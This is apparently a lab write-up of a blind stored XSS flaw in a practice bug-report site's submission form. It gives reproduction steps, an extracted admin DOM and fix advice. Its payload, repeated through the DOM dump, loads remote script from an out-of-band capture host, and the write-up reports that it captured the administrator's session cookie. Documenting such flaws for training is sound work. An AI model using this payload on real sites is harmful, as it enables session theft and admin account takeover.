Lab name : Blind XSS - IssuePilot Bug reports, without the noise
# Title
Blind Cross-Site Scripting (XSS) via Project Inquiry Form Leading to Admin Panel Compromise

# Vulnerability Type
Blind Cross-Site Scripting (XSS) / Stored XSS

# Summary
The application is vulnerable to Blind Cross-Site Scripting (XSS) through the public "Submit bug" form. The application fails to properly sanitize or encode user-supplied input in multiple fields (e.g., Bug Title, Description, Steps to Reproduce, Expected/Actual behavior, and Browser/Device) before storing it in the database. When an administrator logs into the backend workspace and views the submitted bug report (`/admin/view.php?id=1`), the malicious JavaScript payload executes automatically in the administrator's browser context. This allows an attacker to execute arbitrary code within the privileged administrator session.

# Vulnerable Endpoint
- `https://issuepilot.pwnedbox.site/submit.php` (Injection Point)
- `https://issuepilot.pwnedbox.site/admin/view.php?id=1` (Execution Point)
# Vulnerable Parameter
- `Bug Title` (Reflected in the `<h1>` tag)
- `Description`
- `Steps to reproduce`
- `Expected behavior`
- `Actual behavior`

# Steps to Reproduce
1. Navigate to the bug submission form: `https://issuepilot.pwnedbox.site/submit.php`
2. In the vulnerable fields (e.g., Bug Title, Description, Steps to reproduce), insert the following payload:  
    `"><img/src/onerror=import('//xss.report/c/cyberbro')>`
3. Fill in the remaining required fields with valid data and click **"Submit bug report"**.
4. Wait for the administrator to log in and view the submitted report in the admin workspace.
5. Observe the out-of-band interaction on `xss.report`. The tool successfully captures the execution, recording the admin's `PHPSESSID` cookie, the URI (`/admin/view.php?id=1`), and the Referrer (`/admin/dashboard.php`), confirming the payload executed in the admin's browser.

# Payload Used 
`"><img/src/onerror=import('//xss.report/c/cyberbro')>`

# Proof of Concept
<img width="1920" height="1042" alt="5" src="https://github.com/user-attachments/assets/5d85cdc2-1cba-4a4e-b58d-1bb2ffe59de2" />
<img width="1920" height="1042" alt="6" src="https://github.com/user-attachments/assets/dbb8cab0-a1ba-444a-b378-7db23fc6d644" />
<img width="1920" height="1040" alt="7" src="https://github.com/user-attachments/assets/595522e4-3ffb-44e9-8ee4-37869a40b2d6" />
<img width="1920" height="1042" alt="8" src="https://github.com/user-attachments/assets/5f462935-d75e-4e48-abd3-6dcda421fa43" />

# Extracted DOM
```js
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>#1 — IssuePilot</title><link rel="stylesheet" href="../assets/style.css"></head><body class="adminbody"><header class="adminnav"><a class="brand" href="dashboard.php"><span class="mark">↗</span> IssuePilot</a><div><a class="btn" href="dashboard.php">← All reports</a></div></header><main class="adminmain"><div class="adminhead"><div><h1>#1 · '"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></h1><div class="muted" style="margin-top:5px">Submitted Oct 22, 2026 · 04:09</div></div></div><div class="detailgrid"><section class="panel"><div class="detailsection"><h3>Description</h3><div class="detailtext">'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></div></div><div class="detailsection"><h3>Steps to reproduce</h3><div class="detailtext">'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></div></div><div class="detailsection"><h3>Expected behavior</h3><div class="detailtext">'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></div></div><div class="detailsection"><h3>Actual behavior</h3><div class="detailtext">'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></div></div></section><aside><form class="panel" method="post" action="update.php"><input type="hidden" name="csrf" value="6969a4fa0d5260376d9b495a26fd91a5449213b07951dba36d2131c78b6eb1da"><input type="hidden" name="id" value="1"><div class="field"><label>Status</label><select class="select" name="status"><option value="new" selected="">New</option><option value="triaged">Triaged</option><option value="in_progress">In Progress</option><option value="resolved">Resolved</option><option value="closed">Closed</option></select></div><div class="field"><label>Severity</label><select class="select" name="severity"><option value="low">Low</option><option value="medium" selected="">Medium</option><option value="high">High</option><option value="critical">Critical</option></select></div><div class="field"><label>Admin note</label><textarea class="textarea" name="admin_note" placeholder="Internal triage note"></textarea></div><button class="btn primary" style="width:100%">Save changes</button></form><form class="panel" style="margin-top:14px" method="post" action="delete.php" onsubmit="return confirm('Delete this report permanently?')"><input type="hidden" name="csrf" value="6969a4fa0d5260376d9b495a26fd91a5449213b07951dba36d2131c78b6eb1da"><input type="hidden" name="id" value="1"><button class="btn" style="width:100%;color:var(--danger)">Delete report</button></form><div class="panel" style="margin-top:14px"><h3>Reporter</h3><p class="muted" style="line-height:1.7">'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"><br>hello@gmail.com<br>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"><br>https://issuepilot.pwnedbox.site/submit.php</p></div></aside></div></main><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>

</body></html>
```

# Impact
Because this is a Blind XSS, the payload executes in the browser of an internal user (specifically, the site administrator) when they view the infected inquiries. This is a critical vulnerability. An attacker can perform the following actions:

- **Session Hijacking & Admin Account Takeover:** Steal the administrator's session cookie (`PHPSESSID`), allowing the attacker to completely bypass authentication and take over the admin account.
- **Privileged Actions:** The script can make authenticated requests on behalf of the administrator to perform sensitive actions, such as altering site content, viewing sensitive customer data, or creating new admin users.
- **Exfiltration of Sensitive Data:** The payload can read the contents of the admin dashboard or internal pages and send them to an attacker-controlled server.

# Recommendation for fix
1. **Output Encoding:** Apply context-aware HTML entity encoding to **all** user-supplied data before rendering it in **any** interface, including backend administrative panels (e.g., convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`). The backend must be treated with the same security rigor as the public-facing frontend.
2. **Input Sanitization:** Use a reputable HTML sanitization library (such as DOMPurify) to strip dangerous tags and attributes from user input before storing it in the database. If rich text is not required, strip all HTML tags entirely.
3. **Content Security Policy (CSP):** Deploy a strict CSP header on the administrative backend to prevent the execution of inline scripts and unauthorized external scripts as a defense-in-depth measure.
4. **Secure Cookies:** Ensure all session cookies (like `PHPSESSID`) use the `HttpOnly` and `Secure` flags to prevent JavaScript from accessing them, mitigating the risk of session hijacking even if an XSS occurs.
